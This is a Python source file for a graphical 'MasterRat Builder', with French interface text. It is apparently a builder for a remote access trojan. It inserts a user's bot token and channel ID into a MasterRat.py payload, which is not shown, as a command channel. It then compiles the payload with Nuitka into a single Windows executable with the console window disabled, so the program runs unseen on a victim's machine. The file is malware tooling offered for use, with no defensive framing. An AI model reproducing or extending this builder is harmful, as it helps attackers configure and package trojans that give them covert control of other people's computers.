import os
import customtkinter as ctk
import shutil
import subprocess

def build_script():
    channel_id = channel_id_entry.get()
    master_token = master_token_entry.get()

    if not os.path.exists("MasterRat.py"):
        result_label.configure(text="Erreur : Le fichier 'MasterRat.py' n'existe pas!", text_color="red")
        return

    try:
        shutil.copy("MasterRat.py", "MasterRat_backup.py")
    except Exception as e:
        result_label.configure(text=f"Erreur de sauvegarde : {str(e)}", text_color="red")
        return

    try:
        with open("MasterRat.py", "r", encoding="utf-8") as f:
            code = f.read()

        code = code.replace("%MASTERTOKEN%", master_token)
        code = code.replace("11010101001010101010101", channel_id)

        with open("MasterRat.py", "w", encoding="utf-8") as f:
            f.write(code)
    except Exception as e:
        result_label.configure(text=f"Erreur de modification du fichier : {str(e)}", text_color="red")
        return

    try:
        subprocess.check_output(["nuitka", "--version"], stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError:
        result_label.configure(text="Erreur : Nuitka n'est pas installé ou non trouvé !", text_color="red")
        return

    nuitka_command = f"nuitka --standalone --onefile --windows-disable-console MasterRat.py"
    try:
        subprocess.run(nuitka_command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        result_label.configure(text=f"Erreur de compilation : {str(e)}", text_color="red")
        return

    try:
        shutil.copy("MasterRat_backup.py", "MasterRat.py")
        os.remove("MasterRat_backup.py")
    except Exception as e:
        result_label.configure(text=f"Erreur lors de la restauration : {str(e)}", text_color="red")
        return

    result_label.configure(text="Compilation terminée avec succès !", text_color="green")

app = ctk.CTk()
app.title("MasterRat Builder")
app.geometry("400x300")

title_label = ctk.CTkLabel(app, text="MasterRat Builder", font=("Arial", 18))
title_label.pack(pady=10)

channel_id_label = ctk.CTkLabel(app, text="Id de ton channel :")
channel_id_label.pack(pady=5)
channel_id_entry = ctk.CTkEntry(app)
channel_id_entry.pack(pady=5)

master_token_label = ctk.CTkLabel(app, text="Token de ton bot :")
master_token_label.pack(pady=5)
master_token_entry = ctk.CTkEntry(app)
master_token_entry.pack(pady=5)

build_button = ctk.CTkButton(app, text="Compile moi !", command=build_script)
build_button.pack(pady=20)

result_label = ctk.CTkLabel(app, text="")
result_label.pack(pady=10)

app.mainloop()